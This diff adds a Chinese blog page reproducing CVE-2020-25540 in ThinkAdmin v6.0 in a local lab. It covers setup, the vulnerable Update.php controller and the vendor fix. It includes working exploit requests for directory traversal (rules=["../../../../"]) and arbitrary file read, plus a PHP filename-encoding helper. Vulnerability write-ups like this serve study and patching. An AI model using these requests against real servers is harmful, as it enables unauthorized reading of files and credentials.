@@ -1,0 +1,345 @@
+<!DOCTYPE html>
+<html>
+<head>
+	<title>他的国</title>
+	<meta charset="utf-8">
+
+	<!-- 引入配置文件 -->
+	
+<link rel="stylesheet" href="/css/main.css">
+
+
+	<!-- 字体图片库 -->
+	
+<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css">
+
+
+	<!-- 代码高亮库 -->
+	
+<link rel="stylesheet" href="/lib/highlight/styles/atom-one-dark.css">
+
+
+	
+<meta name="generator" content="Hexo 5.3.0"></head>
+<body>
+
+	<div id="main">
+		<!-- 引入侧边栏 -->
+		<aside>
+			<!-- 搜索栏 -->
+<div id="search">
+	<input class="search-input" type="text" placeholder="search">
+	<i id="search-icon" class="fa fa-bars" title="切换目录与索引">
+</div>
+
+<!-- 侧边目录栏 -->
+<div id="tree">
+	
+
+	
+					<ul>
+						<li class="directory">
+							<a href="#" class="directory">
+								<i class="fa fa-folder"></i>
+								漏洞复现
+							</a>
+							
+					<ul>
+						<li class="directory">
+							<a href="#" class="directory">
+								<i class="fa fa-folder"></i>
+								中间件
+							</a>
+							
+					<ul>
+						<li class="file active">
+							<a href="/2020/11/27/漏洞复现/中间件/ThinkAdmin6_DT&FR/">
+								<i class="fa fa-file"></i>
+								ThinkAdmin6_DT&FR
+							</a>
+						</li>
+					</ul>
+	
+						</li>
+						
+					</ul>
+	
+					<ul>
+						<li class="directory">
+							<a href="#" class="directory">
+								<i class="fa fa-folder"></i>
+								操作系统
+							</a>
+							
+					<ul>
+						<li class="file">
+							<a href="/2021/01/20/漏洞复现/操作系统/win10_BSOD/">
+								<i class="fa fa-file"></i>
+								win10_BSOD
+							</a>
+						</li>
+					</ul>
+	
+						</li>
+						
+					</ul>
+	
+						</li>
+						
+					</ul>
+	
+</div>
+
+
+<!-- 最尾部添加，这里就不列以前的代码了 -->
+<div id="toc" style="display: none;"></div>
+
+		</aside>
+
+		<!-- 引入导航 -->
+		<nav>
+			<ul id="menu">
+	
+	
+    <li class="menu-item">
+        <a href="/" class="menu-item-link">主页</a>
+    </li>
+    
+    <li class="menu-item">
+        <a href="/about" class="menu-item-link">关于</a>
+    </li>
+    
+
+    
+    
+
+</ul>
+
+		</nav>
+
+		<!-- 引入正文 -->
+		<div id="content">
+			<div>
+	<span id="post-author">求幂级数的收敛域</span>
+	<span id="post-date">2020-11-27 17:07:00</span>
+</div>
+
+<div id="article">
+	<h1 id="ThinkAdmin-v6-0"><a href="#ThinkAdmin-v6-0" class="headerlink" title="ThinkAdmin v6.0"></a>ThinkAdmin v6.0</h1><p>CVE-2020-25540 目录遍历/文件读取漏洞</p>
+<h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>phpstudy2018+ThinkAdmin v6.0.3</p>
+<h3 id="版本-≤-2020-08-03-01"><a href="#版本-≤-2020-08-03-01" class="headerlink" title="版本 ≤ 2020.08.03.01"></a>版本 ≤ 2020.08.03.01</h3><pre><code>https://github.com/zoujingli/ThinkAdmin/tree/a57c3a9373bc89f5eaa4142d047481a898b5757e
+</code></pre>
+<p><img src="https://i.loli.net/2021/02/02/dibga8Ec2YICFsV.png" alt="image-20201127165053412"></p>
+<h3 id="安装Composer命令"><a href="#安装Composer命令" class="headerlink" title="安装Composer命令"></a>安装Composer命令</h3><ol>
+<li>需要先将phpstudy中PHP设置成7.1或以上版本，并把对应的文件夹放入环境变量path中</li>
+</ol>
+<p><img src="https://i.loli.net/2021/02/02/5iRWnfJ8kyxLMXO.jpg" alt="img"> </p>
+<ol start="2">
+<li>在phpstudy服务器中打开php.ini文件，找到extension=php_openssl.dll前面的分号去掉，意思是打开ssl扩展，目的是为了能在cmd命令中能进行访问</li>
+</ol>
+<p><img src="https://i.loli.net/2021/02/02/5MGCLtbod8QKZUY.jpg" alt="img"> </p>
+<ol start="3">
+<li>安装composer.phar，找到下载内容的地方，去下载当前最新版本的composer.phar，双击安装，不用勾选Developer mode</li>
+</ol>
+<p>下载地址<a target="_blank" rel="noopener" href="https://getcomposer.org/Composer-Setup.exe">https://getcomposer.org/Composer-Setup.exe</a></p>
+<p><img src="https://i.loli.net/2021/02/02/afATgLp4JyCzR8s.jpg" alt="img"> </p>
+<ol start="4">
+<li>配置环境变量后自动选择了php-7.2.1-nts</li>
+</ol>
+<p><img src="https://i.loli.net/2021/02/02/X83NMUbkJmhA1uF.jpg" alt="img"> </p>
+<p>然后一直下一步，安装完成</p>
+<p><img src="https://i.loli.net/2021/02/02/T4RP6VXCz1fpNus.jpg" alt="img"> </p>
+<ol start="5">
+<li>安装完成后在cmd命令行输入composer查看是否安装成功</li>
+</ol>
+<p><img src="https://i.loli.net/2021/02/02/6vVEq53tArWneYo.jpg" alt="img"> </p>
+<ol start="6">
+<li>设置阿里云 Composer 代理</li>
+</ol>
+<p>由于国内访问Composer比较慢，建议设置阿里云Composer镜像，运行如下命令设置阿里云代理</p>
+<p>composer config -g repo.packagist composer <a target="_blank" rel="noopener" href="https://mirrors.aliyun.com/composer">https://mirrors.aliyun.com/composer</a></p>
+<ol start="7">
+<li>搜索下载ThinkAdminV6的漏洞版本到本地</li>
+</ol>
+<p><img src="https://i.loli.net/2021/02/02/q6r4ZLsXeTQlAOg.jpg" alt="img"> </p>
+<ol start="8">
+<li>进入ThinkAdmin目录进行安装</li>
+</ol>
+<p>composer install</p>
+<p><img src="https://i.loli.net/2021/02/02/tWb4ejvgcO56MCD.jpg" alt="img"> </p>
+<ol start="9">
+<li>然后进config/database.php目录下修改配置文件，需要创建一个数据库</li>
+</ol>
+<p><img src="https://i.loli.net/2021/02/02/eHpoKcjI3ksYm7l.jpg" alt="img"> </p>
+<p>修改数据库连接所用的账号密码    root/root</p>
+<h3 id="导入数据库"><a href="#导入数据库" class="headerlink" title="导入数据库"></a>导入数据库</h3><p>要将 thinkadmin 安装包里的 admin_v6.sql 文件导入到数据库</p>
+<p><img src="https://i.loli.net/2021/02/02/bhpFcv9uys8BXA6.png" alt="image-20201119172826252"></p>
+<h4 id="快速新建数据库"><a href="#快速新建数据库" class="headerlink" title="快速新建数据库"></a>快速新建数据库</h4><p><img src="https://i.loli.net/2021/02/02/BJqX1SMwNWga4Qb.png" alt="image-20201119173927815"></p>
+<p>数据库名：admin_v6</p>
+<h4 id="使用source-命令"><a href="#使用source-命令" class="headerlink" title="使用source 命令"></a>使用source 命令</h4><p>进入mysql数据库控制台,</p>
+<p>如mysql -u root -p</p>
+<p>mysql&gt;use 数据库</p>
+<p>然后使用source命令,后面参数为脚本文件(如这里用到的.sql)</p>
+<p>mysql&gt;source [.sql文件绝对路径]</p>
+<p><img src="https://i.loli.net/2021/02/02/N1tIBD9XiVp7k3Q.png" alt="image-20201119173718247"></p>
+<p>成功导入</p>
+<p><img src="https://i.loli.net/2021/02/02/BwnLvkuyfPpSCAH.png" alt="image-20201119190143471"></p>
+<ol start="10">
+<li>php进行运行 php think run </li>
+</ol>
+<p><img src="https://i.loli.net/2021/02/02/DGPoEnlzYTM3heF.jpg" alt="img"> </p>
+<p><a href="http://ip:8000打开页面">http://ip:8000打开页面</a></p>
+<p><img src="https://i.loli.net/2021/02/02/O2ZqyEsju3xWgP5.jpg" alt="img"> </p>
+<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>目录遍历/任意文件读取</p>
+<h3 id="目录遍历"><a href="#目录遍历" class="headerlink" title="目录遍历"></a>目录遍历</h3><p>可以在浏览器直接构造，也可以burp抓包改包</p>
+<p><img src="https://i.loli.net/2021/02/02/YmeOdVXcH9GAWw2.png" alt="image-20201130102402855"></p>
+<p>①使用burp抓取首页的包，发送到Repeater模块构造数据包获取目录 </p>
+<p>②在Repeater模块中把GET修改成POST，url后添加 ?s=admin/api.Update/node</p>
+<p>在下面输入rules=%5b%22%2f%22%5d    //rules=[“/“]</p>
+<p>③点击”Send”发送，可以看到返回包中带有目录列表了</p>
+<p><img src="https://i.loli.net/2021/02/02/3ZAknXGdLqFpE64.png" alt="image-20201130103530091"></p>
+<p> 注：上图虽然显示“获取文件列表成功”，但是并没有返回列表内容，是因为抓包时不是初次加载页面，Content-Type字段被替换成为Cache-Control。</p>
+<p><img src="https://i.loli.net/2021/02/02/5TDy3MlXGOHw76B.png" alt="image-20201130103922136"></p>
+<p> 抓第一次加载页面时的包就没问题</p>
+<h4 id="返回结果"><a href="#返回结果" class="headerlink" title="返回结果"></a>返回结果</h4><p>rules=[“/“]会遍历 E:\phpstudy2018\PHPTutorial\WWW\ThinkAdmin6 下所有文件</p>
+<p><img src="https://i.loli.net/2021/02/02/TGHwnpxaXgbvQMd.png" alt="image-20201130104655742"></p>
+<pre><code>HTTP/1.1 200 OK
+Host: 192.168.80.111:8000
+Date: Mon, 30 Nov 2020 10:32:39 +0800
+Connection: close
+X-Powered-By: PHP/7.2.1
+Content-Type:application/json; charset=utf-8
+Set-Cookie: think_lang=zh-cn; path=/
+Set-Cookie: PHPSESSID=8a43a78b3ebd325158a78608ac57107a; path=/
+
+&#123;&quot;code&quot;:1,&quot;info&quot;:&quot;获取文件列表成功！&quot;,&quot;data&quot;:&#123;&quot;rules&quot;:[&quot;\/&quot;],&quot;ignore&quot;:[],&quot;list&quot;:[
+&#123;&quot;name&quot;:&quot;\/admin_v6.sql&quot;,&quot;hash&quot;:&quot;a6add0e2aab0e7d45f1ef35ad7846c52&quot;&#125;,
+/*省略一万行*/
+&#123;&quot;name&quot;:&quot;\/启动须知.txt&quot;,&quot;hash&quot;:&quot;263d4e9a08fbab5ac55e78cf537acb6f&quot;&#125;]&#125;&#125;
+</code></pre>
+<p>rules=[“../“]会遍历 E:\phpstudy2018\PHPTutorial\WWW 下所有文件</p>
+<p>rules=[“../../../../“]会遍历 E:\ 下所有文件</p>
+<p><img src="https://i.loli.net/2021/02/02/bf5pzTgGJAlyEoO.png" alt="image-20201130105401110"></p>
+<p>目录遍历内容超出限制会报错</p>
+<h3 id="任意文件读取"><a href="#任意文件读取" class="headerlink" title="任意文件读取"></a>任意文件读取</h3><p>①读取根目录下【启动须知.txt】</p>
+<p><img src="https://i.loli.net/2021/02/02/8ySknowlZBqYreR.png" alt="image-20201130110018142"></p>
+<p>②使用加密函数对文件名进行加密，等下传参要用</p>
+<pre><code class="php">&lt;?php
+    function encode($content)
+    &#123;
+        //加密正常文件名
+        //list($chars, $length) = [&#39;&#39;, strlen($string = iconv(&#39;UTF-8&#39;, &#39;GBK//TRANSLIT&#39;, $content))];
+
+        //加密中文文件名
+        list($chars, $length) = [&#39;&#39;, strlen($string = iconv(&#39;UTF-8&#39;, &#39;GB2312&#39;, $content))];
+        for ($i = 0; $i &lt; $length; $i++)
+            $chars .= str_pad(base_convert(ord($string[$i]), 10, 36), 2, 0, 0);
+        return $chars;
+    &#125;
+$content=&quot;启动须知.txt&quot;;
+echo encode($content);
+?&gt; 
+</code></pre>
+<p>在虚拟机运行（需要PHP环境）</p>
+<p><img src="https://i.loli.net/2021/02/02/GxMKdEvYgt239C5.png" alt="image-20201130112949484"></p>
+<p>或者在线运行</p>
+<p><a target="_blank" rel="noopener" href="http://www.dooccn.com/php7/">http://www.dooccn.com/php7/</a></p>
+<p><img src="https://i.loli.net/2021/02/02/whcZ2sHLKmxfG7B.png" alt="image-20201130113109377"></p>
+<p>5i6s524v5s6j5y4q1a383c38</p>
+<p>③访问下面链接即可读取到文件内容</p>
+<pre><code>http://192.168.80.111:8000/admin.html?s=admin/api.Update/get/encode/5i6s524v5s6j5y4q1a383c38
+</code></pre>
+<p><img src="https://i.loli.net/2021/02/02/z8ae9RPstn5A3mZ.png" alt="image-20201130113200217"></p>
+<p>base64解密得到文件内容</p>
+<p><img src="https://i.loli.net/2021/02/02/Swbe8U6vCRhMZPV.png" alt="image-20201130144634925"></p>
+<h2 id="漏洞原因"><a href="#漏洞原因" class="headerlink" title="漏洞原因"></a>漏洞原因</h2><p>由于Update.php这个文件中的函数方法没有授权导致的</p>
+<h3 id="Update-php"><a href="#Update-php" class="headerlink" title="Update.php"></a>Update.php</h3><p>E:\phpstudy2018\PHPTutorial\WWW\ThinkAdmin6\app\admin\controller\api\Update.php</p>
+<pre><code class="php">&lt;?php
+
+// +----------------------------------------------------------------------
+// | ThinkAdmin
+// +----------------------------------------------------------------------
+// | 版权所有 2014~2020 广州楚才信息科技有限公司 [ http://www.cuci.cc ]
+// +----------------------------------------------------------------------
+// | 官方网站: https://thinkadmin.top
+// +----------------------------------------------------------------------
+// | 开源协议 ( https://mit-license.org )
+// +----------------------------------------------------------------------
+// | gitee 代码仓库：https://gitee.com/zoujingli/ThinkAdmin
+// | github 代码仓库：https://github.com/zoujingli/ThinkAdmin
+// +----------------------------------------------------------------------
+
+namespace app\admin\controller\api;
+
+use think\admin\Controller;
+use think\admin\service\InstallService;
+
+/**
+ * 安装服务端支持
+ * Class Update
+ * @package app\admin\controller\api
+ */
+class Update extends Controller
+&#123;
+    /**
+     * 读取文件内容
+     */
+    public function get()
+    &#123;
+        if (file_exists($file = $this-&gt;app-&gt;getRootPath() . decode(input(&#39;encode&#39;, &#39;0&#39;)))) &#123;
+            $this-&gt;success(&#39;读取文件成功！&#39;, [&#39;content&#39; =&gt; base64_encode(file_get_contents($file))]);
+        &#125; else &#123;
+            $this-&gt;error(&#39;读取文件内容失败！&#39;);
+        &#125;
+    &#125;
+
+    /**
+     * 读取文件列表
+     */
+    public function node()
+    &#123;
+        $this-&gt;success(&#39;获取文件列表成功！&#39;, InstallService::instance()-&gt;getList(
+            json_decode($this-&gt;request-&gt;post(&#39;rules&#39;, &#39;[]&#39;, &#39;&#39;), true),
+            json_decode($this-&gt;request-&gt;post(&#39;ignore&#39;, &#39;[]&#39;, &#39;&#39;), true)
+        ));
+    &#125;
+
+&#125;
+</code></pre>
+<h2 id="修复方式"><a href="#修复方式" class="headerlink" title="修复方式"></a>修复方式</h2><p>1.升级到2020.08.03.01之后的版本</p>
+<p>2.使用官方的临时修复方案</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/zoujingli/ThinkAdmin/issues/244">https://github.com/zoujingli/ThinkAdmin/issues/244</a></p>
+
+</div>
+
+		</div>
+		
+	</div>
+
+	<!-- 引入代码高亮的 js -->
+	
+<script src="/lib/highlight/highlight.pack.js"></script>
+
+
+	<!-- 引入 jquery -->
+	
+<script src="/lib/jquery-3.4.1.min.js"></script>
+
+
+	<!-- 引入 pjax -->
+	
+<script src="/lib/jquery.pjax.js"></script>
+
+	
+	<!-- 引入 js 文件 -->
+	
+<script src="/js/main.js"></script>
+
+
+	<script src="https://cdn.jsdelivr.net/npm/live2d-widget@3.0.4/lib/L2Dwidget.min.js"></script>
+	<script type="text/javascript">
+	L2Dwidget.init();
+	</script>
+
+</body>
+</html>
